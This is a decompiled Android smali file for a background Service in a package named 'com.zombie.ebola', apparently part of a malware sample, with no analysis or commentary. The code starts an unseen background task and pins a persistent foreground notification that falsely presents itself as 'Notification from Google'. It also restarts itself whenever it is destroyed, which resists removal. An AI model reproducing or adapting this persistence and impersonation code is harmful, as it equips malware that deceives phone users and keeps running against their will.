.class public Lcom/zombie/ebola/zero;
.super Landroid/app/Service;


# instance fields
.field a:Z

.field b:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-boolean v0, p0, Lcom/zombie/ebola/zero;->a:Z

    iput-boolean v0, p0, Lcom/zombie/ebola/zero;->b:Z

    return-void
.end method

.method private a()V
    .locals 3

    iget-boolean v0, p0, Lcom/zombie/ebola/zero;->b:Z

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/zombie/ebola/zero;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/zombie/ebola/zero;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    const/4 v5, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Lcom/zombie/ebola/u;

    invoke-direct {v0, p0}, Lcom/zombie/ebola/u;-><init>(Lcom/zombie/ebola/zero;)V

    new-array v1, v5, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/u;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    new-instance v0, Landroid/app/Notification;

    const v1, 0x108008a

    const-string v2, "Notification from Google"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/zombie/ebola/bobS;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x34000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const/high16 v3, 0x8000000

    invoke-static {v2, v5, v1, v3}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-virtual {p0}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "Google"

    const-string v4, "New notification"

    invoke-virtual {v0, v2, v3, v4, v1}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x62

    iput v1, v0, Landroid/app/Notification;->flags:I

    const/4 v1, 0x2

    invoke-virtual {p0, v1, v0}, Lcom/zombie/ebola/zero;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    invoke-direct {p0}, Lcom/zombie/ebola/zero;->a()V

    return-void
.end method
